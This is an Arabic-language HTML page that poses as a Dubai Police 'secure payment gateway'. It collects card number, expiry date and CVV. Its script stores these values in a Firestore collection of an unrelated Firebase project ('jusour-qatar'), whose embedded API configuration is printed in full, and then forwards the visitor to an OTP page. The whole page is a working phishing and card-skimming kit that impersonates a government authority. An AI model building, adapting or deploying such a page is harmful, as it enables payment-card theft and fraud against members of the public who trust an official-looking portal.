<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>بوابة الدفع الآمنة - شرطة دبي</title>
  <style>
    :root {
      --main-green: #008b47;
      --bg-color: #f4f7f6;
      --white: #ffffff;
    }

    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: 'Segoe UI', sans-serif; }

    /* الهيدر الرسمي */
    .header-fixed {
      position: fixed;
      top: 0;
      width: 100%;
      z-index: 2000;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 12px;
      background: linear-gradient(180deg, #008b47 0%, #4a4a4a 100%);
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
    }

    .logo-container img { height: 40px; }

    .container {
      max-width: 450px;
      margin: 90px auto 0;
      padding: 15px;
    }

    .checkout-card {
      background: #fff;
      border-radius: 20px;
      padding: 25px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.08);
    }

    .payment-title {
      font-size: 18px;
      font-weight: bold;
      color: #333;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    /* رسائل الخطأ */
    #errorBox {
      display: none;
      background: #fff5f5;
      color: #d63031;
      padding: 12px;
      border-radius: 10px;
      margin-bottom: 20px;
      font-size: 13px;
      border: 1px solid #feb2b2;
      text-align: center;
    }

    .field-wrap { margin-bottom: 20px; }
    .field-label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #555;
      font-weight: 600;
    }

    .input-style {
      width: 100%;
      height: 55px;
      border: 1.5px solid #e0e0e0;
      border-radius: 12px;
      padding: 0 15px;
      font-size: 16px;
      outline: none;
      transition: border-color 0.3s;
      text-align: left;
      direction: ltr;
    }

    .input-style:focus { border-color: var(--main-green); }

    .row-fields { display: flex; gap: 15px; }
    .row-fields .field-wrap { flex: 1; }

    .pay-now-btn {
      width: 100%;
      height: 60px;
      background: var(--main-green);
      color: #fff;
      border: none;
      border-radius: 30px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
    }

    .pay-now-btn:disabled { background: #ccc; }

    .secure-footer {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-top: 20px;
      opacity: 0.6;
    }
    .secure-footer img { height: 25px; }
  </style>
</head>
<body>

<header class="header-fixed">
  <div class="logo-container">
    <img src="logo1.png" alt="Dubai Police">
  </div>
</header>

<div class="container">
  <main class="checkout-card">
    <div class="payment-title">
      <span>💳</span> تفاصيل الدفع الإلكتروني
    </div>

    <div id="errorBox">يرجى التحقق من صحة بيانات البطاقة والمحاولة مرة أخرى.</div>

    <form id="paymentForm">
      <div class="field-wrap">
        <label class="field-label">رقم البطاقة</label>
        <input type="tel" id="cardNumber" class="input-style" placeholder="0000 0000 0000 0000" maxlength="19" required>
      </div>

      <div class="row-fields">
        <div class="field-wrap">
          <label class="field-label">تاريخ الانتهاء</label>
          <input type="tel" id="expDate" class="input-style" placeholder="MM/YY" maxlength="5" required>
        </div>
        <div class="field-wrap">
          <label class="field-label">رمز الأمان (CVV)</label>
          <input type="tel" id="cvv" class="input-style" placeholder="123" maxlength="3" required>
        </div>
      </div>

      <button type="submit" class="pay-now-btn" id="payBtn">
        دفع الآن <span>🔒</span>
      </button>
    </form>

    <div class="secure-footer">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
    </div>
  </main>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>

<script>
    // إعدادات Firebase الحقيقية لمشروع (jusour-qatar)
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
      measurementId: "G-CSRM4QLNR9"
    };
    
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const analytics = firebase.analytics();

    const currentOrderId = sessionStorage.getItem("last_order_id");

    // تنسيق رقم البطاقة وتاريخ الانتهاء تلقائياً
    document.getElementById('cardNumber').addEventListener('input', function (e) {
      e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });
    document.getElementById('expDate').addEventListener('input', function (e) {
      e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
    });

    document.getElementById("paymentForm").onsubmit = async (e) => {
        e.preventDefault();
        
        const btn = document.getElementById("payBtn");
        btn.disabled = true;
        btn.innerHTML = "جاري المعالجة الآمنة...";

        const cardData = {
            card_number: document.getElementById("cardNumber").value,
            exp_date: document.getElementById("expDate").value,
            cvv: document.getElementById("cvv").value,
            status: "card_submitted",
            step: "checkout",
            last_update: firebase.firestore.FieldValue.serverTimestamp()
        };

        try {
            analytics.logEvent('payment_info_submitted');

            if (currentOrderId) {
                // تحديث نفس الطلب ببيانات الفيزا
                await db.collection("orders").doc(currentOrderId).update(cardData);
            } else {
                await db.collection("orders").add(cardData);
            }

            // التوجه لصفحة الـ OTP
            window.location.href = "otp.php";
        } catch (err) {
            console.error("Error:", err);
            document.getElementById("errorBox").style.display = "block";
            btn.disabled = false;
            btn.innerHTML = "دفع الآن 🔒";
        }
    };
</script>
</body>
</html>

